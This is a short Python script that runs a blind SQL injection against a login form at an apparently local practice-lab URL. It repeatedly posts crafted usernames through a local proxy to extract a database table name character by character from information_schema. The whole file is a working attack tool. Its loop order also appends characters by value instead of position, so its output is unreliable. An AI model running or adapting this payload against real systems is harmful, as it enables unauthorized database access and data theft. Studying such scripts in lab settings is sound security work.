#!/usr/bin/python
import requests

url = "http://localhost/labs/sql/login.php"
data = list()
for num in range(48, 126):
	for leng in range(1,20):

		payload = "' or ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),"+str(leng)+",1))="+str(num)+"#"
		print(payload)
		login = {
			"uname":payload,
			"pwd":"dummy"
		}
		proxy = {"http":"http://127.0.0.1:8080"}
		resp = requests.post(url, data=login, proxies=proxy)

		if "Username/Password is invalid." not in resp.text:
			print("\n\n\n"+chr(num)+"\n\n\n")
			data.append(chr(num))

print("".join(data)) 